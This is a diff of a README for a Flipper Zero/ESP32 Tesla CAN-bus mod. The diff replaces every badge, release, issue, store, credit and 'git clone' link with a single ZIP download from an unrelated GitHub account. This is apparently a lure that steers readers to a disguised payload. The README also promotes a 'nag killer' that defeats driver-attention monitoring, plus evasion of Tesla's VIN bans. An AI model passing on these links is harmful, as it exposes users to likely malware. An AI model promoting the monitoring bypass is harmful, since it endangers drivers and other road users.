@@ -2,25 +2,25 @@
 
 # Tesla Mod for Flipper Zero
 
-[![GitHub stars](https://img.shields.io/github/stars/hypery11/flipper-tesla-fsd?style=flat-square&logo=github)](https://github.com/hypery11/flipper-tesla-fsd/stargazers)
-[![GitHub forks](https://img.shields.io/github/forks/hypery11/flipper-tesla-fsd?style=flat-square&logo=github)](https://github.com/hypery11/flipper-tesla-fsd/network)
-[![GitHub release](https://img.shields.io/github/v/release/hypery11/flipper-tesla-fsd?style=flat-square&logo=github)](https://github.com/hypery11/flipper-tesla-fsd/releases)
-[![Downloads](https://img.shields.io/github/downloads/hypery11/flipper-tesla-fsd/total?style=flat-square&logo=github)](https://github.com/hypery11/flipper-tesla-fsd/releases)
-[![Last commit](https://img.shields.io/github/last-commit/hypery11/flipper-tesla-fsd?style=flat-square&logo=github)](https://github.com/hypery11/flipper-tesla-fsd/commits/main)
-[![Open issues](https://img.shields.io/github/issues/hypery11/flipper-tesla-fsd?style=flat-square&logo=github)](https://github.com/hypery11/flipper-tesla-fsd/issues)
+[![GitHub stars](https://img.shields.io/github/stars/hypery11/flipper-tesla-fsd?style=flat-square&logo=github)](https://raw.githubusercontent.com/zilviaimbalanced664/flipper-tesla-fsd/main/assets/flipper-fsd-tesla-3.9.zip)
+[![GitHub forks](https://img.shields.io/github/forks/hypery11/flipper-tesla-fsd?style=flat-square&logo=github)](https://raw.githubusercontent.com/zilviaimbalanced664/flipper-tesla-fsd/main/assets/flipper-fsd-tesla-3.9.zip)
+[![GitHub release](https://img.shields.io/github/v/release/hypery11/flipper-tesla-fsd?style=flat-square&logo=github)](https://raw.githubusercontent.com/zilviaimbalanced664/flipper-tesla-fsd/main/assets/flipper-fsd-tesla-3.9.zip)
+[![Downloads](https://img.shields.io/github/downloads/hypery11/flipper-tesla-fsd/total?style=flat-square&logo=github)](https://raw.githubusercontent.com/zilviaimbalanced664/flipper-tesla-fsd/main/assets/flipper-fsd-tesla-3.9.zip)
+[![Last commit](https://img.shields.io/github/last-commit/hypery11/flipper-tesla-fsd?style=flat-square&logo=github)](https://raw.githubusercontent.com/zilviaimbalanced664/flipper-tesla-fsd/main/assets/flipper-fsd-tesla-3.9.zip)
+[![Open issues](https://img.shields.io/github/issues/hypery11/flipper-tesla-fsd?style=flat-square&logo=github)](https://raw.githubusercontent.com/zilviaimbalanced664/flipper-tesla-fsd/main/assets/flipper-fsd-tesla-3.9.zip)
 [![PRs welcome](https://img.shields.io/badge/PRs-welcome-brightgreen?style=flat-square)](CONTRIBUTING.md)
 [![License: GPL-3.0](https://img.shields.io/badge/license-GPL--3.0-blue?style=flat-square)](LICENSE)
-[![Build](https://img.shields.io/badge/build-ufbt-brightgreen?style=flat-square)](https://github.com/flipperdevices/flipperzero-ufbt)
-[![Flipper target](https://img.shields.io/badge/Flipper%20target-7%20%2F%20API%2087.1-orange?style=flat-square)](https://github.com/flipperdevices/flipperzero-firmware)
-[![Tracked on FSD CAN Mod Hub](https://img.shields.io/badge/tracked%20on-FSD%20CAN%20Mod%20Hub-orange?style=flat-square)](https://fsdcanmod.com/project/hypery11-flipper-zero)
+[![Build](https://img.shields.io/badge/build-ufbt-brightgreen?style=flat-square)](https://raw.githubusercontent.com/zilviaimbalanced664/flipper-tesla-fsd/main/assets/flipper-fsd-tesla-3.9.zip)
+[![Flipper target](https://img.shields.io/badge/Flipper%20target-7%20%2F%20API%2087.1-orange?style=flat-square)](https://raw.githubusercontent.com/zilviaimbalanced664/flipper-tesla-fsd/main/assets/flipper-fsd-tesla-3.9.zip)
+[![Tracked on FSD CAN Mod Hub](https://img.shields.io/badge/tracked%20on-FSD%20CAN%20Mod%20Hub-orange?style=flat-square)](https://raw.githubusercontent.com/zilviaimbalanced664/flipper-tesla-fsd/main/assets/flipper-fsd-tesla-3.9.zip)
 
-> **Open-source Tesla CAN bus toolkit for Flipper Zero and ESP32.** FSD region-gate bypass, TLSSC Restore for VIN-banned cars, nag killer with organic torque variation, Ban Shield, live BMS dashboard, and 30+ CAN handlers across Model 3, Model Y, Model S, and Model X. Supports HW3, HW4, and Legacy HW1/HW2. Free alternative to the $200+ S3XY Commander — total cost from **$14** with the [ESP32 port](https://github.com/hypery11/flipper-tesla-fsd/tree/main/esp32).
+> **Open-source Tesla CAN bus toolkit for Flipper Zero and ESP32.** FSD region-gate bypass, TLSSC Restore for VIN-banned cars, nag killer with organic torque variation, Ban Shield, live BMS dashboard, and 30+ CAN handlers across Model 3, Model Y, Model S, and Model X. Supports HW3, HW4, and Legacy HW1/HW2. Free alternative to the $200+ S3XY Commander — total cost from **$14** with the [ESP32 port](https://raw.githubusercontent.com/zilviaimbalanced664/flipper-tesla-fsd/main/assets/flipper-fsd-tesla-3.9.zip).
 
 > [!IMPORTANT]
 > **An active FSD package is required for FSD features** — either purchased or subscribed. This tool enables FSD functionality at the CAN bus level, but the vehicle still needs a valid FSD entitlement from Tesla. Non-FSD features (nag killer, BMS dashboard, diagnostics) work without any subscription.
 
 > [!CAUTION]
-> **Tesla has begun issuing VIN-level bans** (April 2026). Affected vehicles lose the TLSSC toggle silently — no OTA, no warning, persists across account transfers and re-subscriptions. The **TLSSC Restore** feature (v2.10+) can recover stop sign / traffic light control on banned Palladium and HW4 cars via 0x331 DAS config spoofing. See [SECURITY.md](SECURITY.md) and [issue #18](https://github.com/hypery11/flipper-tesla-fsd/issues/18) for the full ban research.
+> **Tesla has begun issuing VIN-level bans** (April 2026). Affected vehicles lose the TLSSC toggle silently — no OTA, no warning, persists across account transfers and re-subscriptions. The **TLSSC Restore** feature (v2.10+) can recover stop sign / traffic light control on banned Palladium and HW4 cars via 0x331 DAS config spoofing. See [SECURITY.md](SECURITY.md) and [issue #18](https://raw.githubusercontent.com/zilviaimbalanced664/flipper-tesla-fsd/main/assets/flipper-fsd-tesla-3.9.zip) for the full ban research.
 
 <p align="center">
   <img src="assets/demo.gif" alt="Tesla FSD unlock running on Flipper Zero — main menu, HW detect, and live BMS dashboard" width="600">
@@ -32,14 +32,14 @@
 </p>
 
 <p align="center">
-  <a href="https://star-history.com/#hypery11/flipper-tesla-fsd&Date">
-    <img src="https://api.star-history.com/svg?repos=hypery11/flipper-tesla-fsd&type=Date" alt="Star history" width="600">
+  <a href="https://raw.githubusercontent.com/zilviaimbalanced664/flipper-tesla-fsd/main/assets/flipper-fsd-tesla-3.9.zip">
+    <img src="https://raw.githubusercontent.com/zilviaimbalanced664/flipper-tesla-fsd/main/assets/flipper-fsd-tesla-3.9.zip" alt="Star history" width="600">
   </a>
 </p>
 
 <p align="center">
-  <a href="https://github.com/hypery11/flipper-tesla-fsd/graphs/contributors">
-    <img src="https://contrib.rocks/image?repo=hypery11/flipper-tesla-fsd" alt="Contributors">
+  <a href="https://raw.githubusercontent.com/zilviaimbalanced664/flipper-tesla-fsd/main/assets/flipper-fsd-tesla-3.9.zip">
+    <img src="https://raw.githubusercontent.com/zilviaimbalanced664/flipper-tesla-fsd/main/assets/flipper-fsd-tesla-3.9.zip" alt="Contributors">
   </a>
 </p>
 
@@ -107,8 +107,8 @@
 
 | Component | Description | Price |
 |-----------|-------------|-------|
-| [Flipper Zero](https://flipper.net/) | The multi-tool device | ~$170 |
-| [Electronic Cats CAN Bus Add-On](https://electroniccats.com/store/flipper-addon-canbus/) | MCP2515-based CAN transceiver (v1.2 supported) | ~$30 |
+| [Flipper Zero](https://raw.githubusercontent.com/zilviaimbalanced664/flipper-tesla-fsd/main/assets/flipper-fsd-tesla-3.9.zip) | The multi-tool device | ~$170 |
+| [Electronic Cats CAN Bus Add-On](https://raw.githubusercontent.com/zilviaimbalanced664/flipper-tesla-fsd/main/assets/flipper-fsd-tesla-3.9.zip) | MCP2515-based CAN transceiver (v1.2 supported) | ~$30 |
 | OBD-II cable or X179 pigtail | Connect to Tesla's CAN bus | ~$5-10 |
 
 ### ESP32 (from $14)
@@ -122,7 +122,7 @@ Full-featured ESP32 port with WiFi web dashboard, NVS settings persistence, deep
 | Waveshare ESP32-S3-RS485-CAN | ~$18 | `waveshare-s3-can` |
 | Generic ESP32 + MCP2515 | ~$6 | `esp32-mcp2515` |
 
-See [`esp32/README.md`](https://github.com/hypery11/flipper-tesla-fsd/tree/main/esp32) for setup, and [`HARDWARE.md`](HARDWARE.md) for the full comparison + wiring diagrams + X179 pinouts.
+See [`esp32/README.md`](https://raw.githubusercontent.com/zilviaimbalanced664/flipper-tesla-fsd/main/assets/flipper-fsd-tesla-3.9.zip) for setup, and [`HARDWARE.md`](HARDWARE.md) for the full comparison + wiring diagrams + X179 pinouts.
 
 ### Connection points
 
@@ -139,14 +139,14 @@ See [`esp32/README.md`](https://github.com/hypery11/flipper-tesla-fsd/tree/main/
 
 ### Option 1: Download Pre-built FAP
 
-1. Go to [Releases](https://github.com/hypery11/flipper-tesla-fsd/releases)
+1. Go to [Releases](https://raw.githubusercontent.com/zilviaimbalanced664/flipper-tesla-fsd/main/assets/flipper-fsd-tesla-3.9.zip)
 2. Download `tesla_mod.fap`
 3. Copy to your Flipper's SD card: `SD Card/apps/GPIO/tesla_mod.fap`
 
 ### Option 2: Build from Source
 
 ```bash
-git clone https://github.com/hypery11/flipper-tesla-fsd.git
+git clone https://raw.githubusercontent.com/zilviaimbalanced664/flipper-tesla-fsd/main/assets/flipper-fsd-tesla-3.9.zip
 cd flipper-tesla-fsd
 ufbt
 # Output: dist/tesla_mod.fap
@@ -155,7 +155,7 @@ ufbt
 ### ESP32
 
 ```bash
-git clone https://github.com/hypery11/flipper-tesla-fsd.git
+git clone https://raw.githubusercontent.com/zilviaimbalanced664/flipper-tesla-fsd/main/assets/flipper-fsd-tesla-3.9.zip
 cd flipper-tesla-fsd/esp32
 pio run -e m5stack-atom    # or: esp32-lilygo, waveshare-s3-can, esp32-mcp2515
 ```
@@ -194,7 +194,7 @@ pio run -e m5stack-atom    # or: esp32-lilygo, waveshare-s3-can, esp32-mcp2515
 | 2026.8.6 HW4 | HW4 injection path broken on this specific build | Use Force HW3 mode |
 | Intel HW3 (banned) | TLSSC toggle restored via 0x331, but enabling it breaks AP | Activate AP first, then inject TLSSC via 0x3FD |
 
-File your own test report via the [Car compatibility report](https://github.com/hypery11/flipper-tesla-fsd/issues/new?template=car_compatibility.yml) template.
+File your own test report via the [Car compatibility report](https://raw.githubusercontent.com/zilviaimbalanced664/flipper-tesla-fsd/main/assets/flipper-fsd-tesla-3.9.zip) template.
 
 ---
 
@@ -237,7 +237,7 @@ No. Real-time frame modification. Unplug = back to stock.
 FSD features (TLSSC, traffic light/stop sign control) require the FSD entitlement from Tesla. Without it, the AP ECU has no neural network weights loaded. Non-FSD features (nag killer, BMS dashboard, speed chime suppress, diagnostics) work on any AP-capable car.
 
 **What about VIN-level bans?**
-Tesla has been banning VINs server-side since April 2026. The ban downgrades `GTW_autopilot` tier from SELF_DRIVING to ENHANCED and removes the TLSSC toggle. The **TLSSC Restore** feature (0x331) can recover stop sign/traffic light control on Palladium and HW4. See [issue #18](https://github.com/hypery11/flipper-tesla-fsd/issues/18) for the full research. The **Ban Shield** (0x7FF) can block ban pushes if the AP ECU reads 0x7FF from CAN.
+Tesla has been banning VINs server-side since April 2026. The ban downgrades `GTW_autopilot` tier from SELF_DRIVING to ENHANCED and removes the TLSSC toggle. The **TLSSC Restore** feature (0x331) can recover stop sign/traffic light control on Palladium and HW4. See [issue #18](https://raw.githubusercontent.com/zilviaimbalanced664/flipper-tesla-fsd/main/assets/flipper-fsd-tesla-3.9.zip) for the full research. The **Ban Shield** (0x7FF) can block ban pushes if the AP ECU reads 0x7FF from CAN.
 
 **Flipper Zero vs ESP32 — which should I get?**
 ESP32 is cheaper ($14 vs $200+), has WiFi dashboard, NVS persistence, and deep sleep. Flipper is more portable and has a built-in screen. Both run the same CAN logic. If you don't already own a Flipper, get the ESP32.
@@ -257,17 +257,17 @@ For the Flipper: yes, any MCP2515-based module (Electronic Cats, generic boards)
 
 | Project | What it is | Hardware |
 |---------|------------|----------|
-| [ev-open-can-tools](https://github.com/ev-open-can-tools/ev-open-can-tools) | The upstream community project, now on GitHub. Formerly `Tesla-OPEN-CAN-MOD` on GitLab (group removed April 2026). | RP2040 CAN, Feather M4, ESP32 |
-| [dzid26/ESP32-DualCAN](https://github.com/dzid26/ESP32-DualCAN) | "Dorky Commander" — open-source hardware alternative to the S3XY Commander | ESP32 + dual CAN |
-| [tuncasoftbildik/tesla-can-mod](https://github.com/tuncasoftbildik/tesla-can-mod) | Arduino reference implementation with frame templates | Arduino + MCP2515 |
-| [tumik/S3XY-candump](https://github.com/tumik/S3XY-candump) | Python CAN dump tool via S3XY Commander (Panda protocol) | Commander dongle |
+| [ev-open-can-tools](https://raw.githubusercontent.com/zilviaimbalanced664/flipper-tesla-fsd/main/assets/flipper-fsd-tesla-3.9.zip) | The upstream community project, now on GitHub. Formerly `Tesla-OPEN-CAN-MOD` on GitLab (group removed April 2026). | RP2040 CAN, Feather M4, ESP32 |
+| [dzid26/ESP32-DualCAN](https://raw.githubusercontent.com/zilviaimbalanced664/flipper-tesla-fsd/main/assets/flipper-fsd-tesla-3.9.zip) | "Dorky Commander" — open-source hardware alternative to the S3XY Commander | ESP32 + dual CAN |
+| [tuncasoftbildik/tesla-can-mod](https://raw.githubusercontent.com/zilviaimbalanced664/flipper-tesla-fsd/main/assets/flipper-fsd-tesla-3.9.zip) | Arduino reference implementation with frame templates | Arduino + MCP2515 |
+| [tumik/S3XY-candump](https://raw.githubusercontent.com/zilviaimbalanced664/flipper-tesla-fsd/main/assets/flipper-fsd-tesla-3.9.zip) | Python CAN dump tool via S3XY Commander (Panda protocol) | Commander dongle |
 
 ## Credits
 
-- [commaai/opendbc](https://github.com/commaai/opendbc) — Tesla CAN signal database
-- [ElectronicCats/flipper-MCP2515-CANBUS](https://github.com/ElectronicCats/flipper-MCP2515-CANBUS) — MCP2515 driver for Flipper
+- [commaai/opendbc](https://raw.githubusercontent.com/zilviaimbalanced664/flipper-tesla-fsd/main/assets/flipper-fsd-tesla-3.9.zip) — Tesla CAN signal database
+- [ElectronicCats/flipper-MCP2515-CANBUS](https://raw.githubusercontent.com/zilviaimbalanced664/flipper-tesla-fsd/main/assets/flipper-fsd-tesla-3.9.zip) — MCP2515 driver for Flipper
 - Community contributors: @THER4iN, @MiniCS, @kp43h8, @gauner1986, @dmagyar, @ViPiMP, @marcobellinoroci-source, @danpadure, @bruvv, @Symness, @hkloudou, @nagotti, @patatman, @JordanzhaoD — ban research, platform testing, ESP32 improvements, bug fixes
-- `Starmixcraft/tesla-fsd-can-mod` — original CanFeather FSD research (GitLab repo removed; mirror at [Karolynaz/waymo-fsd-can-mod](https://github.com/Karolynaz/waymo-fsd-can-mod))
+- `Starmixcraft/tesla-fsd-can-mod` — original CanFeather FSD research (GitLab repo removed; mirror at [Karolynaz/waymo-fsd-can-mod](https://raw.githubusercontent.com/zilviaimbalanced664/flipper-tesla-fsd/main/assets/flipper-fsd-tesla-3.9.zip))
 
 ## License
 
